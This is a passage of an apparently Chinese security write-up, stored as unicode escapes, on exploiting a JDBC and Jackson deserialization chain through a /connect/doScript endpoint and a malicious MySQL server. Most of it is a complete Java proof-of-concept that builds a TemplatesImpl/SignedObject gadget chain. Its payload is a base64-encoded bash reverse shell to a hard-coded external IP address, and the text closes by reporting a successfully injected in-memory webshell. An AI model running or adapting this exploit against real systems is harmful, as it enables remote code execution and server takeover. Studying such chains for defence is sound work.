\u6CE8\u610F\uFF1A\u5199\u5165\u7684agscript\u811A\u672C\u5185\u5BB9\u9700\u8981\u7B26\u5408json\u683C\u5F0F\u4E0D\u7136\u4E0D\u4F1A\u88AB\u8BFB\u53D6

\u8BBF\u95EE/connect/doScript\u89E6\u53D1jdbc\u53CD\u5E8F\u5217\u5316

![](https://xzfile.aliyuncs.com/media/upload/picture/20241203235520-ffd47b9c-b18e-1.png)

\u63A5\u4E0B\u6765\u662F\u6076\u610Fmysql\u670D\u52A1\u5668\u6253jackson\u7684\u4E8C\u6B21\u53CD\u5E8F\u5217\u5316\u94FE

import com.fasterxml.jackson.databind.node.POJONode;
import java.io.ByteArrayOutputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.security.*;
import java.util.Base64;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import javassist.*;
import javax.management.BadAttributeValueExpException;
public class SignedObjectBAVEPoC
{
public static void main(String[] args) throws Exception {
ClassPool pool = ClassPool.getDefault();
CtClass ctClass0 = pool.get("com.fasterxml.jackson.databind.node.BaseJsonNode");
CtMethod writeReplace = ctClass0.getDeclaredMethod("writeReplace");
ctClass0.removeMethod(writeReplace);
ctClass0.toClass();
ClassPool pool2 = ClassPool.getDefault();
CtClass ctClass = pool2.makeClass("a");
CtClass superClass = pool2.get(AbstractTranslet.class.getName());
ctClass.setSuperclass(superClass);
CtConstructor constructor = new CtConstructor(new CtClass[]{},ctClass);
constructor.setBody("Runtime.getRuntime().exec(\\"bash -c {echo,YmFzaCAgIC1jICAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMjQuMjIwLjM3LjE3My84OTk5IDA+JjEn}|{base64,-d}|{bash,-i}\\");");
ctClass.addConstructor(constructor);
byte[] bytes = ctClass.toBytecode();
TemplatesImpl templatesImpl = new TemplatesImpl();
setFieldValue(templatesImpl, "_bytecodes", new byte[][]{bytes});
setFieldValue(templatesImpl, "_name", "bbb");
setFieldValue(templatesImpl, "_tfactory", null);
POJONode jsonNodes = new POJONode(templatesImpl);
BadAttributeValueExpException exp = new BadAttributeValueExpException(null);
Field val = Class.forName("javax.management.BadAttributeValueExpException").getDeclaredField("val");
val.setAccessible(true);
val.set(exp,jsonNodes);
ByteArrayOutputStream barr = new ByteArrayOutputStream();
ObjectOutputStream objectOutputStream = new ObjectOutputStream(barr);
//\u4E8C\u6B21\u53CD\u5E8F\u5217\u5316
KeyPairGenerator kpg = KeyPairGenerator.getInstance("DSA");
kpg.initialize(1024);
KeyPair kp = kpg.generateKeyPair();
SignedObject signedObject = new SignedObject(exp, kp.getPrivate(), Signature.getInstance("DSA"));
POJONode node = new POJONode(signedObject);
BadAttributeValueExpException val2 = new BadAttributeValueExpException(null);
setFieldValue(val2, "val", node);
System.out.println(Base64.getEncoder().encodeToString(serialize(val2)));
}    public static byte[] serialize(Object obj) throws IOException {
ByteArrayOutputStream baos = new ByteArrayOutputStream();
ObjectOutputStream oos = new ObjectOutputStream(baos);
oos.writeObject(obj);
return baos.toByteArray();}
public static void setFieldValue(Object obj, String field, Object val) throws Exception{
Field dField = obj.getClass().getDeclaredField(field);
dField.setAccessible(true);
dField.set(obj, val);
}
}

\u6210\u529F\u6253\u5165\u5185\u5B58\u9A6C

![](https://xzfile.aliyuncs.com/media/upload/picture/20241203235501-f4959e5a-b18e-1.png)`;export{e as _};
